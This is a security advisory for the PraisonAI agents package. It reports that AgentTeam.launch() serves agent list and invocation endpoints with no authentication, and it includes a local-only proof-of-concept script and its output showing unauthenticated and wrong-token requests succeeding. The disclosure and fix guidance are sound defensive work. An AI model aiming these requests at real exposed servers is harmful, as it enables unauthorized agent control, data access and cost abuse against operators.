# [C] PraisonAI AgentTeam.launch exposes unauthenticated remote agent listing and invocation endpoints

## Summary
Severity: Critical
Advisory: GHSA-x8cv-xmq7-p8xp
CVE: CVE-2026-57118
CWE: CWE-306, CWE-862
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-x8cv-xmq7-p8xp
Type: github-advisory

## Affected
- PyPI: `praisonaiagents` — affected >=0 <1.6.59

## Details
# PraisonAI `AgentTeam.launch()` exposes unauthenticated remote agent invocation endpoints

## Summary

PraisonAI's documented Python `AgentTeam.launch()` / `Agents.launch()` HTTP server starts externally reachable agent invocation endpoints without any authentication enforcement.

The current implementation registers `GET /{path}/list`, `POST /{path}`, and `POST /{path}/{agent_id}` routes. The POST routes directly call `agent.chat(...)`. Requests with no `Authorization` header are accepted, and requests with an obviously wrong bearer token are also accepted. The default Python API bind host for `Agents.launch()` is `0.0.0.0`, and official documentation shows `host="0.0.0.0"` for remote access.

This is a sibling/incomplete-fix variant of PraisonAI's prior unauthenticated API server and call server advisory family. Nearby server surfaces were hardened to require tokens, fail closed, or bind locally by default, but the `AgentTeam.launch()` FastAPI path still exposes unauthenticated agent execution on current upstream main and the latest release.

This report is scoped to the Python `AgentTeam.launch()` / `Agents.launch()` route-registration path. It does not require adjudicating whether the separate `praisonai serve agents --api-key` CLI path is correctly enforced.

## Affected Components

- Package: `praisonaiagents`
- Current upstream main tested: `2f9677abb2ea68eab864ee8b6a828fd0141612e1`
- Latest release tag tested: `v4.6.57`
- Primary file: `src/praisonai-agents/praisonaiagents/agents/agents.py`
- Current line references: `AgentTeam.launch()` begins at line 1923;
  the group `POST` route is registered at line 2007; the group handler invokes
  `agent_instance.chat(...)` at line 2042; the unauthenticated list route is
  registered at line 2086; per-agent handlers invoke `agent.chat(...)` at line
  2117.
- Primary class/API: `AgentTeam.launch()` / exported alias `Agents`
- Affected routes:
  - `GET /{path}/list`: lists deployed agents.
  - `POST /{path}`: sequentially invokes all agents in the team.
  - `POST /{path}/{agent_id}`: invokes a specific agent.

Current vulnerable sink:

```python
@app.post(path)
async def handle_query(request: Request, query_data: Optional[AgentQuery] = None):
    ...
    response = await loop.run_in_executor(
        None,
        copy_context_to_callable(lambda ci=current_input: agent_instance.chat(ci)),
    )
```

Per-agent sink:

```python
app.post(agent_path)(create_agent_handler(agent_instance))
...
response = await loop.run_in_executor(
    None,
    copy_context_to_callable(lambda q=query: agent.chat(q)),
)
```

List endpoint:

```python
@app.get(f"{path}/list")
async def list_agents():
    return {"agents": [{"name": agent.display_name, "id": ...} for agent in self.agents]}
```

There is no middleware, dependency, token comparison, bearer-token parsing, API-key check, or startup fail-closed guard in this launch path.

## Security Boundary

This is not a trust-model-only report. PraisonAI's own current security documentation says API servers were hardened so that anonymous requests return `401` and API servers bind to `127.0.0.1` by default after the prior unauthenticated API advisory family.

The codebase also contains hardened sibling implementations:

- `praisonai.deploy.api` now has `AUTH_ENABLED`, `PRAISONAI_API_TOKEN`, generated tokens, and `401 Unauthorized` checks (`src/praisonai/praisonai/deploy/api.py` lines 44-62 and 69-97).
- `praisonai.gateway.server.WebSocketGateway` validates external bind safety, requires a token for external binds, checks bearer/query/cookie auth, and validates WebSocket auth (`src/praisonai/praisonai/gateway/server.py` lines 328-424).
- `praisonai call` hardening is documented as requiring `CALL_SERVER_TOKEN` or explicit opt-out.

`AgentTeam.launch()` remains outside those shared controls even though it exposes the same class of network-facing agent invocation surface.

## Local-Only Reproduction

Run the local-only PoV script below with current source on `PYTHONPATH`:

```bash
PYTHONPATH="/path/to/PraisonAI/src/praisonai-agents:/path/to/PraisonAI/src/praisonai" \
  python poc_agentteam_launch_unauth.py
```

Expected vulnerable result:

```text
[poc] HIT: unauthenticated clients invoked AgentTeam endpoints
```

Observed on current upstream main:

```json
{
  "results": [
    {
      "body": {
        "agents": [
          {
            "id": "pov_agent",
            "name": "pov_agent"
          }
        ]
      },
      "case": "no_auth_list",
      "method": "GET",
      "path": "/agents/list",
      "status": 200
    },
    {
      "case": "no_auth_group",
      "method": "POST",
      "path": "/agents",
      "status": 200,
      "body": {
        "final_response": "POV_UNAUTH_AGENTTEAM_EXECUTED:marker",
        "query": "marker",
        "results": [
          {
            "agent": "pov_agent",
            "response": "POV_UNAUTH_AGENTTEAM_EXECUTED:marker"
          }
        ]
      }
    },
    {
      "case": "wrong_bearer_group",
      "method": "POST",
      "path": "/agents",
      "status": 200,
      "body": {
        "final_response": "POV_UNAUTH_AGENTTEAM_EXECUTED:marker",
        "query": "marker",
        "results": [
          {
            "agent": "pov_agent",
            "response": "POV_UNAUTH_AGENTTEAM_EXECUTED:marker"
          }
        ]
      }
    },
    {
      "case": "no_auth_per_agent",
      "method": "POST",
      "path": "/agents/pov_agent",
      "status": 200,
      "body": {
        "agent": "pov_agent",
        "query": "marker",
        "response": "POV_UNAUTH_AGENTTEAM_EXECUTED:marker"
      }
    }
  ]
}
```

The PoV binds to `127.0.0.1`, uses a randomly selected local port, stubs `agent.chat()` to avoid any external LLM provider, and sends only local HTTP requests.

Standalone PoV script:

```python
#!/usr/bin/env python3
"""
Local-only PoV for PRAI-CAND-003.

Starts a PraisonAI AgentTeam/Agents HTTP server on 127.0.0.1 with a stubbed
agent response, then proves both the group endpoint and per-agent endpoint
execute without authentication. No model provider or external network is used.
"""

import json
import socket
import time
import types
import threading
from contextlib import closing

import requests
from praisonaiagents import Agent, Agents


def _free_port() -> int:
    with closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def main() -> int:
    port = _free_port()

    agent = Agent(
        name="pov_agent",
        role="tester",
        goal="test",
        backstory="test",
        llm=None,
    )

    def stub_chat(self, query, *args, **kwargs):
        return f"POV_UNAUTH_AGENTTEAM_EXECUTED:{query}"

    agent.chat = types.MethodType(stub_chat, agent)
    team = Agents(agents=[agent])
    launch_thread = threading.Thread(
        target=lambda: team.launch(path="/agents", port=port, host="127.0.0.1", debug=False),
        daemon=True,
    )
    launch_thread.start()

    base = f"http://127.0.0.1:{port}"
    for _ in range(40):
        try:
            response = requests.get(base + "/health", timeout=0.25)
            if response.status_code == 200:
                break
        except Exception:
            time.sleep(0.1)
    else:
        raise SystemExit("[poc] MISS: server did not start")

    cases = [
        ("no_auth_list", "GET", {}, "/agents/list", None),
        ("no_auth_group", "POST", {}, "/agents", {"query": "marker"}),
        (
            "wrong_bearer_group",
            "POST",
            {"Authorization": "Bearer definitely-wrong"},
            "/agents",
            {"query": "marker"},
        ),
        ("no_auth_per_agent", "POST", {}, "/agents/pov_agent", {"query": "marker"}),
    ]
    results = []
    for name, method, headers, path, body in cases:
        if method == "GET":
            response = requests.get(base + path, headers=headers, timeout=5)
        else:
            response = requests.post(base + path, json=body, headers=headers, timeout=5)
        try:
            body = response.json()
        except Exception:
            body = response.text
        results.append(
            {
                "case": name,
                "method": method,
                "path": path,
                "status": response.status_code,
                "body": body,
            }
        )

    print(json.dumps({"port": port, "results": results}, indent=2, sort_keys=True))

    expected_marker = "POV_UNAUTH_AGENTTEAM_EXECUTED:marker"
    for result in results:
        if result["status"] != 200:
            raise SystemExit(f"[poc] MISS: {result['case']} returned {result['status']}")
        if result["case"] == "no_auth_list" and "pov_agent" not in json.dumps(result["body"]):
            raise SystemExit("[poc] MISS: unauthenticated list endpoint did not expose agent id")
        if result["case"] == "no_auth_list":
            continue
        body_text = json.dumps(result["body"], sort_keys=True)
        if expected_marker not in body_text:
            raise SystemExit(f"[poc] MISS: marker absent for {result['case']}")

    print("[poc] HIT: unauthenticated clients invoked AgentTeam endpoints")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

## Impact

If an operator follows the documented remote-server pattern and exposes an `AgentTeam.launch()` server on a reachable interface, any network client can invoke the deployed agents without credentials.

Depending on the deployed agents, an unauthenticated caller may be able to:

- enumerate available agent IDs and names through `GET /{path}/list`;
- trigger model/API spend by repeatedly invoking agents;
- drive agents connected to local tools, internal APIs, SaaS integrations, browsers, files, or workflow actions;
- trigger side effects through per-agent endpoints even if the operator expected only the team endpoint to be used;
- access responses generated from connected private context, memory, or knowledge sources.

The impact is deployment-dependent, but the missing access control is in the framework's advertised network server path rather than in user application code.

## Affected-Version Sweep

Static sweep of release tags shows the unauthenticated `AgentTeam.launch()` handler and per-agent registration present in:

- `v4.6.33`
- `v4.6.39`
- `v4.6.40`
- `v4.6.56`
- `v4.6.57`

The issue remains present on current upstream main `2f9677abb2ea68eab864ee8b6a828fd0141612e1`.

The generated deploy API path was hardened between `v4.6.33` and `v4.6.39`, and remains hardened in `v4.6.57`. This supports the incomplete-fix/sibling-callsite classification: the fix did not cover `AgentTeam.launch()`.

## Root Cause

The `AgentTeam.launch()` FastAPI server is implemented as an independent route-registration path. It does not reuse the hardened API server authentication helper, the gateway bind-aware auth guard, or a shared server-auth policy.

The security-sensitive action is direct invocation of `agent.chat()` from a network request. The route has no access-control check before that call.

## Suggested Fix

Recommended approach:

1. Add a shared authentication helper for all network-facing agent invocation servers.
2. Make `AgentTeam.launch()` fail closed for non-loopback binds unless a token/API key is configured.
3. Require `Authorization: Bearer <token>` or an explicit documented API-key header for `POST /{path}`, `GET /{path}/list`, and `POST /{path}/{agent_id}`.
4. Default `AgentTeam.launch()` to `host="127.0.0.1"` unless an explicit unsafe/remote option plus auth is configured.
5. Add regression tests proving:
   - no token returns `401`;
   - wrong token returns `403`;
   - correct token can list agents;
   - correct token can invoke the team endpoint;
   - correct token can invoke the per-agent endpoint;
   - external bind without auth fails at startup.

If unauthenticated local development remains supported, require loopback binding and a loud explicit unsafe opt-out for externally bound unauthenticated servers.

## Severity

Recommended severity: Critical

Rationale:

- Network attack vector: the documented server supports remote access via `0.0.0.0`.
- Low complexity: a single POST request invokes the agent.
- No privileges: no credentials are required.
- No user interaction: once the server is exposed, the attacker directly sends requests.
- High confidentiality/integrity/availability impact depends on deployed agents and connected tools, but this is the same agent-control class as prior PraisonAI unauthenticated API advisories. The official remote-agent documentation explicitly discusses remote agents with tools, memory, knowledge, and auth headers, so the security-relevant configuration is not hypothetical.

If maintainers want to score based only on minimal agents with no tools and no private context, the lower-bound impact would still include unauthorized remote invocation and model/API spend.

## Notes

The direct single-agent `Agent.launch()` path in current source appears to share the same missing-auth design, but it raises `NameError: name '_server_lock' is not defined` before serving in the tested local source checkout. This report therefore makes the primary impact claim only for the confirmed working `AgentTeam.launch()` / `Agents.launch()` path.

The CLI `praisonai serve agents` surface advertises a `--api-key` option and should be reviewed by maintainers when applying a shared fix, but this submission does not depend on a CLI-specific bypass claim.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-x8cv-xmq7-p8xp
- https://github.com/MervinPraison/PraisonAI
